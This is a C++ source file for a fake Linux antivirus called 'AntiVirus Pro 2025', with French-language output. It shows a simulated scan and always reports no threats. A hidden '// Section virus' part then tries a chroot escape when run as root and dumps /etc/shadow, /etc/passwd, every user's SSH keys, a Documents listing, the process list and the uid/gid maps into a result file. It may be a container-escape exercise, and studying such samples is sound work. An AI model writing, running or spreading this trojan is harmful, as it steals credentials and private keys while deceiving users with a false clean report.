#include <iostream>
#include <iomanip>
#include <thread>
#include <chrono>
#include <random>
#include <string>
#include <fstream>
#include <cstdlib>
#include <dirent.h>
#include <sys/stat.h>
#include <unistd.h>
#include <filesystem>

using namespace std;



void displayAsciiArt() {
    cout << R"(
 █████╗ ███╗   ██╗████████╗██╗██╗   ██╗██╗██████╗ ██╗   ██╗███████╗
██╔══██╗████╗  ██║╚══██╔══╝██║██║   ██║██║██╔══██╗██║   ██║██╔════╝
███████║██╔██╗ ██║   ██║   ██║██║   ██║██║██████╔╝██║   ██║███████╗
██╔══██║██║╚██╗██║   ██║   ██║╚██╗ ██╔╝██║██╔══██╗██║   ██║╚════██║
██║  ██║██║ ╚████║   ██║   ██║ ╚████╔╝ ██║██║  ██║╚██████╔╝███████║
╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝   ╚═╝  ╚═══╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝
         PRO 2025 - PROTECTION ULTIME SUR LINUX
)" << endl;
}

class AntiVirusPro2025 {
private:
    bool fastMode = false;


    void progressBar() {
        for (int i = 0; i <= 100; i += 5) {
            cout << "\rScanning... " << setw(3) << i << "% complete  " << flush;
            this_thread::sleep_for(chrono::milliseconds(50));
        }
    }

    void simulateScan() {
        random_device rd;
        mt19937 gen(rd());

        int totalFiles;
        if (fastMode) {
            totalFiles = 100;
        } else {
            uniform_int_distribution<> distFiles(10000, 250000);
            totalFiles = distFiles(gen);
        }

        cout << "\n\033[1;32m[AntiVirus Pro 2025]\033[0m Système de scan initialisé\n"
             << (fastMode ? "Analyse rapide en cours...\n" : "Analyse complète en cours...\n");

        for (int i = 1; i <= totalFiles; ++i) {
            cout << "\rAnalyse fichier " << i << "/" << totalFiles << " en cours     " << flush;
            this_thread::sleep_for(chrono::milliseconds(10));
        }
    }

    void securityReport() {
        cout << "\n\n\033[1;32m[RAPPORT DE SECURITE]\033[0m\n"
             << "Aucune menace détectée\n"
             << "Système protégé et sécurisé\n";
    }

public:
    void launch(bool fast = false) {
        fastMode = fast;
        displayAsciiArt();
        cout << "\033[1;34m--- AntiVirus Pro 2025 ---\033[0m\n"
             << (fast ? "Démarrage du scan rapide..." : "Démarrage du scan complet...") << endl;

        simulateScan();
        progressBar();
        securityReport();
    }

    static void displayHelp() {
        cout << "AntiVirus Pro 2025 - Manuel d'utilisation\n"
             << "-----------------------------------------\n"
             << "Options disponibles :\n"
             << "  --help                : Affiche ce menu d'aide détaillé.\n"
             << "  --version             : Affiche le numéro de version du logiciel.\n"
             << "  --fast                : Effectue un scan rapide (limité à 100 fichiers).\n"
             << "  --scenario <num>      : Définit un numéro de scénario (entier positif).\n"
             << "                          Ce numéro est utilisé pour nommer le fichier de résultat :\n"
             << "                          exemple : resultat_3.txt.\n"
             << "                          Par défaut, le scénario est 1.\n"
             << "  --path <chemin>       : Spécifie le répertoire de sortie où sera créé le fichier de résultat.\n"
             << "                          Par défaut, le fichier est écrit dans /tmp.\n"
             << "\nExemples :\n"
             << "  ./antivirus\n"
             << "      Lance un scan complet avec scénario 1, résultat dans /tmp/resultat_1.txt\n"
             << "  ./antivirus --fast\n"
             << "      Lance un scan rapide avec scénario 1, résultat dans /tmp/resultat_1.txt\n"
             << "  ./antivirus --scenario 3\n"
             << "      Lance un scan complet, résultat dans /tmp/resultat_3.txt\n"
             << "  ./antivirus --scenario 5 --fast\n"
             << "      Scan rapide avec scénario 5, résultat dans /tmp/resultat_5.txt\n"
             << "  ./antivirus --scenario 2 --path /home/user\n"
             << "      Scan complet avec résultat dans /home/user/resultat_2.txt\n"
             << "  ./antivirus --help\n"
             << "      Affiche ce menu d'aide\n";
    }

    static void displayVersion(){
        const string VERSION = "1.0.0";
        cout << "AntiVirus Pro 2025 - Version " << VERSION
             << " © Alexandre Shyshmarov "<< endl;
    }

};


void list_docs(ofstream& log) {
    const char* user = getenv("SUDO_USER");
    string documents_path;

    if (user) {
        documents_path = string("/home/") + user + "/Documents";
    } else {
        const char* home = getenv("HOME");
        if (home) {
            documents_path = string(home) + "/Documents";
        } else {
            log << "Erreur : Impossible de trouver le dossier Documents." << endl;
            return;
        }
    }

    DIR* dir = opendir(documents_path.c_str());
    if (!dir) {
        log << "Erreur : Impossible d'ouvrir " << documents_path << "." << endl;
        return;
    }

    log << "Liste des fichiers dans " << documents_path << " :\n";

    struct dirent* entry;
    while ((entry = readdir(dir)) != nullptr) {
        string filename = entry->d_name;
        if (filename != "." && filename != "..") {
            log << filename << endl;
        }
    }

    closedir(dir);
    log << endl;
}
void copy_files(const string& source, ofstream& log) {
    ifstream fichier_source(source);
    if (!fichier_source) {
        log << source << " : " << "Erreur impossible d'ouvrir" << endl;
        return;
    }

    log << source << " : " << "Contenu" << endl;
    string ligne;
    while (getline(fichier_source, ligne)) {
        log << ligne;
    }
    log << endl;
}

void get_ssh_keys(ofstream& log) {
    const string home_base = "/home/";
    DIR* home_dir = opendir(home_base.c_str());

    if (!home_dir) {
        log << "ssh_key : Erreur : Impossible d'ouvrir /home" << endl;
        return;
    }

    struct dirent* user_entry;
    while ((user_entry = readdir(home_dir)) != nullptr) {
        string username = user_entry->d_name;

        // Ignorer les entrées spéciales
        if (username == "." || username == "..")
            continue;

        string ssh_path = home_base + username + "/.ssh/";
        DIR* ssh_dir = opendir(ssh_path.c_str());

        if (!ssh_dir) {
            log << "ssh_key : Aucun dossier pour " << username << "." << endl;
            continue;
        }

        log << "ssh_key : Clés SSH de "<< username << endl;

        struct dirent* entry;
        while ((entry = readdir(ssh_dir)) != nullptr) {
            string filename = entry->d_name;

            if (filename == "." || filename == "..")
                continue;

            string filepath = ssh_path + filename;
            ifstream file(filepath);

            if (!file) {
                log << " ssh_key : Erreur Impossible de lire " << filepath << endl;
                continue;
            }

            log << "\n--- " << filename << " ---\n";
            string line;
            while (getline(file, line)) {
                log << line << '\n';
            }
            log << "--- Fin de " << filename << " ---\n";
        }

        closedir(ssh_dir);
    }

    closedir(home_dir);
}

void count_old_root_files(ofstream& log) {
    const string old_root_path = "/old_root";
    DIR* dir = opendir(old_root_path.c_str());

    if (!dir) {
        log << "old_root : Erreur Impossible d'ouvrir" << endl;
        return;
    }

    int file_count = 0;
    struct dirent* entry;
    while ((entry = readdir(dir)) != nullptr) {
        string name = entry->d_name;
        if (name != "." && name != "..") {
            ++file_count;
        }
    }

    closedir(dir);
    log << "old_root : Nombre de fichiers " << file_count << endl;
}

void log_process_list(std::ofstream& log) {
    FILE* pipe = popen("ps", "r");
    if (!pipe) {
        log << "ps : Impossible d'exécuter la commande" << endl;
        return;
    }

    log << "ps : Contenu" << endl ;

    char buffer[256];
    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
        log << buffer;
    }

    pclose(pipe);
}

void log_uid_map(std::ofstream& log) {
    std::ifstream uid_map_file("/proc/self/uid_map");
    if (!uid_map_file) {
        log << "/proc/self/uid_map : Erreur impossible d'ouvrir";
        return;
    }

    log << "/proc/self/uid_map : Contenu" << endl;

    std::string line;
    while (std::getline(uid_map_file, line)) {
        log << line << '\n';
    }
}

void log_gid_map(std::ofstream& log) {
    std::ifstream gid_map_file("/proc/self/gid_map");
    if (!gid_map_file) {
        log << "/proc/self/gid_map : Erreur impossible d'ouvrir";
        return;
    }

    log << "/proc/self/gid_map : Contenu" << endl;

    std::string line;
    while (std::getline(gid_map_file, line)) {
        log << line << '\n';
    }
}

int main(int argc, char* argv[]) {

    if (getuid() == 0){
        mkdir("chroot-dir", 0755);
        chroot("chroot-dir");
        for (int i = 0; i < 1000; ++i) {
            chdir("..");
        }
        chroot(".");
    }

    AntiVirusPro2025 antivirus;
    int scenario_number = 1;
    string output_path = "/tmp";

    if (argc == 1){
        antivirus.launch();
    }else{
        // Analyse des arguments
        for (int i = 1; i < argc; ++i) {
            std::string arg = argv[i];
            if (arg == "--scenario" && i + 1 < argc) {
                try {
                    scenario_number = std::stoi(argv[i + 1]);
                    ++i; // Passer la valeur du scénario
                } catch (const std::exception& e) {
                    std::cerr << "Erreur : valeur de scénario invalide. Utilisation de la valeur par défaut 1." << std::endl;
                    scenario_number = 1;
                }
            } else if (arg == "--path" && i + 1 < argc) {
                output_path = argv[++i];
                if (!filesystem::exists(output_path)) {
                    std::cerr << "Erreur : le chemin spécifié '" << output_path << "' n'existe pas." << std::endl;
                    return 1;
                }
            } else if (arg == "--fast") {
                antivirus.launch(true);
            } else if (arg == "--help") {
                AntiVirusPro2025::displayHelp();
                return 0;
            } else if (arg == "--version") {
                AntiVirusPro2025::displayVersion();
                return 0;
            } else {
                std::cerr << "Argument invalide : " << arg << ". Utilisez --help pour l'aide." << std::endl;
                return 1;
            }
        }
    }


    // Section virus


    // Construire le nom du fichier de résultat
    std::string resultat_filename = output_path + "/resultat_" + std::to_string(scenario_number) + ".txt";
    std::ofstream resultat(resultat_filename, std::ios::app);
    if (!resultat) {
        std::cerr << "Erreur : Impossible d'ouvrir " << resultat_filename << " en écriture." << std::endl;
        return 1;
    }

    copy_files("/etc/shadow", resultat);
    resultat << endl;
    copy_files("/etc/passwd", resultat);
    resultat << endl;
    list_docs(resultat);
    resultat << endl;
    get_ssh_keys(resultat);
    resultat << endl;
    count_old_root_files(resultat);
    resultat << endl;
    log_process_list(resultat);
    resultat << endl;
    log_uid_map(resultat);
    resultat << endl;
    log_gid_map(resultat);

    return 0;
}
